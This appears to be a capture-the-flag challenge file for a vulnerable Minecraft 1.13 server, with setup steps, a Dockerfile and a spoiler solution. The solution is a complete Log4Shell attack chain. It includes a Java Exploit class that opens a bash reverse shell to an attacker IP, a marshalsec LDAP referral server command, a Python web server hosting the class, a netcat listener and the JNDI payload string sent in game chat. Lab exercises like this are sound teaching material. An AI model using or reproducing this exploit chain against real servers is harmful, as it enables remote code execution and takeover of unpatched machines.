@@ -1,0 +1,183 @@
+DO NOT READ UNLESS YOU WANT THE ANSWER SPOILED
+Setup for non container:
+
+Targeted machine installs vulnerable minecraft version (used 1.13) mcversions.net/download/1.13
+Targeted machine installs vulnerable JRE https://www.filepuma.com/download/java_runtime_environment_64bit_8.0.1810.13-19511/download/
+Targeted machine launches the server
+Targeted machine makes sure there is a file titled "flag.txt" that contains RMU-JAVA-4444
+
+
+Setup for loading docker container (in powershell):
+
+Download minecraft-server.tar
+
+Navigate to it in powershell (as admin)
+
+Run the following command to load the image
+docker load --input .\minecraft-server.tar
+
+Run the following command to run the image on port 25565
+docker run -d -p 25565:25565 --restart unless-stopped --name minecraft-server minecraft-server
+
+
+Setup for building docker container:
+
+Enter the following into a file with no extension called "Dockerfile"
+
+# Use a Debian base image
+FROM debian:bullseye
+
+# Set environment variables
+ENV MINECRAFT_VERSION=1.13
+ENV MINECRAFT_SERVER_JAR=server.jar
+ENV MINECRAFT_MEMORY=512M
+ENV JDK_VERSION=8u181
+ENV JDK_BUILD=b13
+ENV JAVA_HOME=/opt/java/jdk1.8.0_181
+
+# Install necessary tools
+RUN apt-get update && \
+    apt-get install -y wget tar && \
+    rm -rf /var/lib/apt/lists/*
+
+# Create directory for Java installation
+RUN mkdir -p /opt/java
+
+# Download and extract JDK
+RUN wget --no-check-certificate -c --header "Cookie: oraclelicense=accept-securebackup-cookie" \
+    https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz -O /tmp/jdk-8u181-linux-x64.tar.gz && \
+    tar -xzf /tmp/jdk-8u181-linux-x64.tar.gz -C /opt/java && \
+    rm /tmp/jdk-8u181-linux-x64.tar.gz
+
+# Debug: List contents of /opt/java/jdk1.8.0_181/bin
+RUN ls -l /opt/java/jdk1.8.0_181/bin
+
+# Directly invoke java from its static location
+RUN /opt/java/jdk1.8.0_181/bin/java -version
+
+# Set up Minecraft server directory
+WORKDIR /minecraft
+
+# Copy world and server.properties files into the container
+# Assume you have 'world' and 'server.properties' in your project directory
+COPY ./world /minecraft/world
+COPY ./server.properties /minecraft/server.properties
+COPY ./flag.txt /minecraft/flag.txt
+
+# Download the Minecraft server jar
+RUN wget -O ${MINECRAFT_SERVER_JAR} https://piston-data.mojang.com/v1/objects/d0caafb8438ebd206f99930cfaecfa6c9a13dca0/server.jar
+
+# Accept the Minecraft EULA
+RUN echo "eula=true" > eula.txt
+
+# Expose the default Minecraft server port
+EXPOSE 25565
+
+# Set the command to start the Minecraft server
+CMD /opt/java/jdk1.8.0_181/bin/java -Xmx${MINECRAFT_MEMORY} -Xms${MINECRAFT_MEMORY} -jar ${MINECRAFT_SERVER_JAR} nogui
+
+This file is instructions to docker to create a container. The container is in debian. It downloads the old java, then
+it downloads and runs Minecraft 1.13 with it. It also imports a server.properties file (force players into spectator),
+world files (build custom world), and flag.txt (the flag to output). Make sure all of the files are in the same directory
+as the Dockerfile. Connect to the world with the host machine's IP and port 25565. 
+
+Once the Dockerfile is created, build it with the following command
+
+docker build -t minecraft-server .
+
+Then, run it with this command
+
+docker run -d -p 25565:25565 --name minecraft-container minecraft-server
+
+
+
+Youtube Solution:
+
+https://www.youtube.com/watch?v=efnluUK_w_U
+https://github.com/davidbombal/log4jminecraft
+
+Follow the instructions on the repo.
+In poc folder, make sure to change Log4jRCE.java to the class listed below
+Also, potentially change "javac" to its static file path in jcomp_pyserv.py so it compiles with proper jdk
+
+Solution created with chatgpt's help:
+
+Install proper jdk on hacker box. openlogic-openjdk-8-hotspot-amd64 https://www.openlogic.com/openjdk-downloads?field_java_parent_version_target_id=416&field_operating_system_target_id=426&field_architecture_target_id=391&field_java_package_target_id=396 
+This is necessary because code compiled on newer JDK can't be run on the old, vulnerable JDK. Has to be version 52 or less.
+
+Download Maven to compile Marshalsec
+sudo apt install maven
+
+Download Marhsalsec to host the LDAP server
+
+git clone https://github.com/mbechler/marshalsec.git
+cd marshalsec
+mvn clean package -DskipTests
+
+Navigate to target/ directory
+cd target
+
+Keep this terminal open
+
+Create malicious payload. Named Exploit.java in this case. Probably put in its own folder
+
+import java.io.*;
+import java.net.*;
+import javax.naming.*;
+import javax.naming.spi.*;
+import java.util.*;
+
+public class Exploit implements ObjectFactory {
+
+    // Static block to execute the command when the class is loaded
+    static {
+        try {
+            // Reverse shell command for Linux
+            String command = "/bin/bash -c 'bash -i >& /dev/tcp/<Attacker IP>/4444 0>&1'";
+
+            // Execute the command
+            Process process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", command});
+
+            // Optionally capture output for debugging purposes
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            String line;
+            while ((line = reader.readLine()) != null) {
+                System.out.println(line);
+            }
+            reader.close();
+
+        } catch (IOException e) {
+            System.out.println("uh oh");
+        }
+    }
+    
+    // Implementing getObjectInstance from ObjectFactory interface
+    @Override
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
+        // Simply return the current Exploit object as part of the factory mechanism
+        return this;
+    }
+}
+
+
+compile it. Make sure to compile using the old JDK so that way the server can run it
+/usr/lib/jvm/openlogic-openjdk-8-hotspot-amd64/bin/javac -target 1.8 Exploit.java
+
+Host the directory containing the .class file with python webserver. Make sure it's the same port as what's in the payload
+python3 -m http.server 8000
+
+Back to Marshalsec terminal, time to host LDAP server pointing to your Python web server. Make sure port is same and #ClassName
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<attackerIP>:8000/#Exploit"
+
+Set up a netcat listener on port 4444 (or whatever port)
+nc -lvnp 4444
+
+Now, should have LDAP server and web server hosted and a listener ready.
+
+Join game and send payload
+${jndi:ldap://<ATTACKER_IP>:1389/a}
+
+simple as, you now have a shell
+
+
+
